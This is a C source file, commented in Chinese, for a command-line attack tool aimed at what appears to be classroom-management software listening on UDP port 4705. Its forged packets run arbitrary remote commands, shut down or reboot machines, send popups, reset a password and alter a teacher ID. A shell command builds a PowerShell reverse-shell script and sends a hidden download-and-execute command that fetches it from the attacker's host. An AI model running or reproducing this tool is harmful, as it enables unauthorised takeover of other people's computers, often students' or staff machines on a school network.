#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <time.h>

#define DEFAULT_PORT 4705
#define MAX_PAYLOAD_SIZE 1024

#pragma comment(lib, "ws2_32.lib")

// 全局变量
int flag = 0;

// 填充数据
void padding(unsigned char* data, int data_len, int pad_len) {
    if (data_len < pad_len) {
        memset(data + data_len, 0x00, pad_len - data_len);
    }
}

// 构造命令数据包
unsigned char* command_pack(const char* command, int* out_len) {
    unsigned char code1[] = {
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x6e, 0x03, 0x00, 0x00, 0xa6, 0x2e, 0x33, 0xa1, 
        0x0d, 0xcd, 0xdc, 0x4d, 0xb1, 0x3c, 0x3f, 0x1b, 
        0x69, 0x58, 0x3d, 0x38, 0x20, 0x4e, 0x00, 0x00, 
        0x0a, 0x14, 0x49, 0x24, 0x61, 0x03, 0x00, 0x00, 
        0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 
        0x01, 0x00, 0x00, 0x00
    };
    
    unsigned char code2[] = {
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x6e, 0x03, 0x00, 0x00, 0xb4, 0x30, 0xe7, 0x2e, 
        0x54, 0xc4, 0x7a, 0x49, 0xa0, 0x60, 0xee, 0x52, 
        0x95, 0xcb, 0x1a, 0xd2, 0x20, 0x4e, 0x00, 0x00, 
        0x0a, 0x14, 0x49, 0x24, 0x61, 0x03, 0x00, 0x00,  
        0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 
        0x01, 0x00, 0x00, 0x00
    };
    
    int command_len = 572;
    int max_len = 906;
    int payload_size = max_len;
    unsigned char* payload = (unsigned char*)malloc(payload_size);
    
    // 选择code1或code2
    if (flag) {
        memcpy(payload, code2, sizeof(code2));
        flag = 0;
    } else {
        memcpy(payload, code2, sizeof(code1));
        flag = 1;
    }
    
    int current_len = sizeof(code1);
    
    // 解析命令
    char app[256] = {0};
    char parameter[256] = {0};
    char* space = strchr(command, ' ');
    
    if (space != NULL) {
        strncpy(app, command, space - command);
        strcpy(parameter, space + 1);
    } else {
        strcpy(app, command);
    }
    
    // 添加app
    for (int i = 0; i < strlen(app); i++) {
        payload[current_len++] = app[i];
        payload[current_len++] = 0x00;
    }
    
    // 填充到command_len
    if (current_len <= command_len) {
        padding(payload, current_len, command_len);
        current_len = command_len;
    }
    
    // 添加parameter
    for (int i = 0; i < strlen(parameter); i++) {
        payload[current_len++] = parameter[i];
        payload[current_len++] = 0x00;
    }
    
    // 填充到max_len
    padding(payload, current_len, max_len);
    *out_len = max_len;
    
    return payload;
}

// 重置密码
unsigned char* reset_password(const char* password, int* out_len) {
    unsigned char code[] = {
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x95, 0x00, 0x00, 0x00, 0x50, 0x25, 0x20, 0x1f, 
        0x8b, 0xd4, 0x14, 0x43, 0xbb, 0xd1, 0xf8, 0x00, 
        0x4b, 0x71, 0xeb, 0xa1, 0x20, 0x4e, 0x00, 0x00, 
        0x0a, 0x14, 0x49, 0x24, 0x88, 0x00, 0x00, 0x00, 
        0x88, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 
        0x7b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 
        0x50, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    };
    
    int max_len = 177;
    int payload_size = max_len;
    unsigned char* payload = (unsigned char*)malloc(payload_size);
    memcpy(payload, code, sizeof(code));
    
    int current_len = sizeof(code);
    
    // 添加密码
    for (int i = 0; i < strlen(password); i++) {
        payload[current_len++] = password[i];
        payload[current_len++] = 0x00;
    }
    
    // 填充到max_len
    padding(payload, current_len, max_len);
    *out_len = max_len;
    
    return payload;
}

// 修改教师ID
unsigned char* modify_teacher_id(int id, int* out_len) {
    if (id > 32) {
        return NULL;
    }
    
    unsigned char code[] = {
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x2f, 0x00, 0x00, 0x00, 0x7c, 0xa0, 0xe1, 0xa6, 
        0x69, 0x64, 0x65, 0x4b, 0x91, 0x37, 0xd7, 0xb8, 
        0xbd, 0xd2, 0x00, 0x7c, 0x20, 0x4e, 0x00, 0x00, 
        0xc0, 0xa8, 0x4a, 0x87, 0x22, 0x00, 0x00, 0x00, 
        0x22, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 
        0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x01, 0x00, 0x00, 0x00
    };
    
    int max_len = 75;
    int payload_size = max_len;
    unsigned char* payload = (unsigned char*)malloc(payload_size);
    memcpy(payload, code, sizeof(code));
    
    // 添加ID
    payload[sizeof(code)] = id;
    
    // 填充到max_len
    memset(payload + sizeof(code) + 1, 0x00, max_len - sizeof(code) - 1);
    *out_len = max_len;
    
    return payload;
}

// 关机或重启
unsigned char* power_pack(int shutdown, int* out_len) {
    unsigned char shutdown_code[] = {
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x2a, 0x02, 0x00, 0x00, 0x80, 0x10, 0x49, 0x33, 
        0x4e, 0xa1, 0x83, 0x49, 0x8f, 0xe8, 0xe6, 0x72, 
        0xac, 0x89, 0xb0, 0xbc, 0x20, 0x4e, 0x00, 0x00, 
        0xc0, 0xa8, 0x4a, 0x87, 0x1d, 0x02, 0x00, 0x00, 
        0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 
        0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 
        0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 
        0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 
        0x02, 0x30,
    };
    
    unsigned char reboot_code[] = {
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x2a, 0x02, 0x00, 0x00, 0x4b, 0x8f, 0x5c, 0xa1, 
        0x48, 0xcf, 0xda, 0x4e, 0x80, 0x03, 0x09, 0x9e, 
        0xca, 0xda, 0x7a, 0x94, 0x20, 0x4e, 0x00, 0x00, 
        0xc0, 0xa8, 0x4a, 0x87, 0x1d, 0x02, 0x00, 0x00, 
        0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x10, 
        0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 
        0x06, 0x5c, 0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60, 
        0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 
        0x02, 0x30, 
    };
    
    int payload_size = 582;
    unsigned char* payload = (unsigned char*)malloc(payload_size);
    
    if (shutdown) {
        memcpy(payload, shutdown_code, sizeof(shutdown_code));
    } else {
        memcpy(payload, reboot_code, sizeof(reboot_code));
    }
    
    // 填充到582字节
    memset(payload + (shutdown ? sizeof(shutdown_code) : sizeof(reboot_code)), 
           0x00, 
           payload_size - (shutdown ? sizeof(shutdown_code) : sizeof(reboot_code)));
    
    *out_len = payload_size;
    return payload;
}

// 消息数据包
unsigned char* message_pack(const char* message, int* out_len) {
    unsigned char code[] = {
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x9e, 0x03, 0x00, 0x00, 0xcf, 0x6b, 0xdd, 0x5f, 
        0x29, 0xcb, 0x50, 0x46, 0x9f, 0xbc, 0xf7, 0xe7, 
        0x65, 0x5e, 0x00, 0x8a, 0x20, 0x4e, 0x00, 0x00, 
        0x0a, 0x14, 0x49, 0x24, 0x91, 0x03, 0x00, 0x00, 
        0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    };
    
    int max_len = 954;
    int payload_size = max_len;
    unsigned char* payload = (unsigned char*)malloc(payload_size);
    memcpy(payload, code, sizeof(code));
    
    // 将消息转换为UTF-16LE格式
    int message_len = strlen(message);
    int utf16_len = message_len * 2 + 2; // +2 for null terminator
    wchar_t* utf16_msg = (wchar_t*)malloc(utf16_len);
    MultiByteToWideChar(CP_ACP, 0, message, -1, utf16_msg, message_len + 1);
    
    // 添加消息内容
    memcpy(payload + sizeof(code), utf16_msg, utf16_len - 2); // 不包括null terminator
    
    // 填充到max_len
    memset(payload + sizeof(code) + utf16_len - 2, 0x00, max_len - sizeof(code) - utf16_len + 2);
    
    free(utf16_msg);
    *out_len = max_len;
    return payload;
}

// 发送UDP数据包
void send_packet(const char* ip, unsigned char* payload, int payload_len, int port) 
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    
    // 初始化Winsock
    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("WSAStartup failed. Error Code: %d\n", WSAGetLastError());
        return;
    }
    
    // 创建socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
        printf("Could not create socket. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }
    
    // 设置服务器地址
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);
    
    // 发送数据
    if (sendto(sock, (const char*)payload, payload_len, 0, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) 
    {
        printf("sendto() failed. Error Code: %d\n", WSAGetLastError());
    } 
    else 
    {
        printf("Packet sent successfully to %s:%d\n", ip, port);
    }
    
    closesocket(sock);
    WSACleanup();
}

// 生成随机可用端口
int get_random_available_port(int min_port, int max_port) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    int port;
    
    // 初始化Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return -1;
    }
    
    srand((unsigned int)time(NULL));
    
    while (1) {
        port = min_port + rand() % (max_port - min_port + 1);
        
        // 创建socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            continue;
        }
        
        // 设置地址
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(port);
        
        // 尝试绑定
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            closesocket(sock);
            WSACleanup();
            return port;
        }
        
        closesocket(sock);
    }
    
    WSACleanup();
    return -1;
}

// 获取反向shell
void get_shell(const char* target_ip, int target_port, const char* rhost) {
    int rport = get_random_available_port(4001, 65535);
    printf("listen: %d, open http server on 8000",rport);
    getchar();
    if (rport == -1) {
        printf("Failed to get random available port\n");
        return;
    }
    
    // 创建PowerShell脚本文件
    FILE* fp = fopen("re.ps1", "w");
    if (fp == NULL) {
        printf("Failed to create PowerShell script file\n");
        return;
    }
    
    fprintf(fp, "$client = New-Object System.Net.Sockets.TCPClient(\"%s\", %d);\n", rhost, rport);
    fprintf(fp, "$stream = $client.GetStream();\n");
    fprintf(fp, "[byte[]]$bytes = 0..65535|%%{0};\n");
    fprintf(fp, "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n");
    fprintf(fp, "    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n");
    fprintf(fp, "    $sendback = (iex $data 2>&1 | Out-String );\n");
    fprintf(fp, "    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n");
    fprintf(fp, "    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n");
    fprintf(fp, "    $stream.Write($sendbyte,0,$sendbyte.Length);\n");
    fprintf(fp, "    $stream.Flush();\n");
    fprintf(fp, "}\n");
    fprintf(fp, "$client.Close()\n");
    fclose(fp);
    
    printf("PowerShell script created. Starting listener on port %d...\n", rport);
    
    // 启动监听器 (需要用户手动运行 listener.py)
    printf("Please run the following command in another terminal:\n");
    printf("python listener.py %d\n", rport);
    
    // 构造并发送payload
    char cmd[512];
    sprintf(cmd, "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://%s:8000/re.ps1')\"", rhost);
    
    int payload_len;
    unsigned char* payload = command_pack(cmd, &payload_len);
    send_packet(target_ip, payload, payload_len, target_port);
    free(payload);
    
    printf("Shell payload sent. Waiting for connection...\n");
}

// 主函数
int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s --ip <target_ip> [--port <target_port>] <command> [options]\n", argv[0]);
        printf("\nCommands:\n");
        printf("  power [--shutdown]       Shutdown or reboot (default: reboot)\n");
        printf("  exec --cmd <command>     Execute remote command\n");
        printf("  shell [--lhost <ip>]     Get reverse shell (default: 127.0.0.1)\n");
        printf("  message --msg <message>  Send popup message\n");
        printf("  reset --pwd <password>   Reset password\n");
        printf("  id --tid <id>            Modify teacher ID (must be <= 32)\n");
        return 1;
    }
    
    // 解析参数
    char* target_ip = NULL;
    int target_port = DEFAULT_PORT;
    char* command = NULL;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--ip") == 0 && i + 1 < argc) {
            target_ip = argv[++i];
        } else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            target_port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "power") == 0) {
            command = "power";
        } else if (strcmp(argv[i], "exec") == 0) {
            command = "exec";
        } else if (strcmp(argv[i], "shell") == 0) {
            command = "shell";
        } else if (strcmp(argv[i], "message") == 0) {
            command = "message";
        } else if (strcmp(argv[i], "reset") == 0) {
            command = "reset";
        } else if (strcmp(argv[i], "id") == 0) {
            command = "id";
        }
    }
    
    if (target_ip == NULL) {
        printf("Target IP is required\n");
        return 1;
    }
    
    if (command == NULL) {
        printf("Command is required\n");
        return 1;
    }
    
    // 根据命令执行相应操作
    if (strcmp(command, "power") == 0) {
        int shutdown = 0;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--shutdown") == 0) {
                shutdown = 1;
                break;
            }
        }
        
        int payload_len;
        unsigned char* payload = power_pack(shutdown, &payload_len);
        send_packet(target_ip, payload, payload_len, target_port);
        free(payload);
    }
    else if (strcmp(command, "exec") == 0) {
        char* cmd = NULL;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--cmd") == 0 && i + 1 < argc) {
                cmd = argv[++i];
                break;
            }
        }
        
        if (cmd == NULL) {
            printf("Command is required for exec\n");
            return 1;
        }
        
        int payload_len;
        unsigned char* payload = command_pack(cmd, &payload_len);
        send_packet(target_ip, payload, payload_len, target_port);
        free(payload);
    }
    else if (strcmp(command, "shell") == 0) {
        char* lhost = "127.0.0.1";
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--lhost") == 0 && i + 1 < argc) {
                lhost = argv[++i];
                break;
            }
        }
        
        get_shell(target_ip, target_port, lhost);
    }
    else if (strcmp(command, "message") == 0) {
        char* msg = NULL;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--msg") == 0 && i + 1 < argc) {
                msg = argv[++i];
                break;
            }
        }
        
        if (msg == NULL) {
            printf("Message is required for message\n");
            return 1;
        }
        
        int payload_len;
        unsigned char* payload = message_pack(msg, &payload_len);
        send_packet(target_ip, payload, payload_len, target_port);
        free(payload);
    }
    else if (strcmp(command, "reset") == 0) {
        char* pwd = NULL;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--pwd") == 0 && i + 1 < argc) {
                pwd = argv[++i];
                break;
            }
        }
        
        if (pwd == NULL) {
            printf("Password is required for reset\n");
            return 1;
        }
        
        int payload_len;
        unsigned char* payload = reset_password(pwd, &payload_len);
        send_packet(target_ip, payload, payload_len, target_port);
        free(payload);
    }
    else if (strcmp(command, "id") == 0) {
        int tid = -1;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--tid") == 0 && i + 1 < argc) {
                tid = atoi(argv[++i]);
                break;
            }
        }
        
        if (tid == -1) {
            printf("Teacher ID is required for id\n");
            return 1;
        }
        
        if (tid > 32) {
            printf("Teacher ID must be <= 32\n");
            return 1;
        }
        
        int payload_len;
        unsigned char* payload = modify_teacher_id(tid, &payload_len);
        if (payload != NULL) {
            send_packet(target_ip, payload, payload_len, target_port);
            free(payload);
        }
    }
    else {
        printf("Unknown command: %s\n", command);
        return 1;
    }
    
    return 0;
}